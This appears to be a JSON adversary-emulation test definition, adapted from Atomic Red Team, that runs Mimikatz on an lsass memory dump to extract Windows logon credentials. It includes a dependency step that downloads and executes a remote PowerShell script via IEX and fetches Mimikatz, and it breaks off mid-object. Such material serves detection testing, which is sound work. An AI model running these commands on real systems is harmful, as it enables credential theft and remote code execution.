{
  "id": "453acf13-1dbd-47d7-b28a-172ce9228023",
  "name": "Offline Credential Theft With Mimikatz",
  "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with\nMimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "ed39a5cf-fc5f-451e-bcdc-78944e380f7d",
      "type": "execute-command",
      "data": {
        "command": "\"#{mimikatz_exe}\" \"sekurlsa::minidump #{input_file}\" \"sekurlsa::logonpasswords full\" exit\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "4288a89d-620b-451d-998a-64512fd4bde4",
      "name": "Check dependency 1/2",
      "description": "Mimikatz must exist on disk at specified location (#{mimikatz_exe})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{mimikatz_exe}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "fe7a7d4e-b873-4796-a475-bb81cf89cc28",
      "name": "Resolve dependency 1/2",
      "description": "Mimikatz must exist on disk at specified location (#{mimikatz_exe})\n",
      "type": "execute-command",
      "data": {
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$basePath = Split-Path \"#{mimikatz_exe}\" | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "17c3dfb7-77fb-4099-865d-eb68f90e8ba8",
      "name": "Re-check dependency 1/2",
      "description": "Mimikatz must exist on disk at specified location (#{mimikatz_exe})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{mimikatz_exe}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "e55c75a9-c661-4ee4-87d2-e5fc6b62c0ef",
      "name": "Check dependency 2/2",
      "description": "Lsass dump must exist at specified location (#{input_file})\n",
      "type": "execute-command",
      "data": {
        "command": "cmd /c \"if not exist #{input_file} (exit /b 1)\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "97c0493f-8ab1-4906-a145-bbebc4fffcbd",
      "name": "Resolve dependency 2/2",
      "description": "Lsass dump must exist at specified location (#{input_file})\n",
      "type": "execute-command",
      "data": {
        "command": "Write-Host \"Create the lsass dump manually using the steps in the previous test (Dump LSASS.exe Memory using Windows Task Manager)\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "b752498b-d808-4176-a911-732dae801a66",
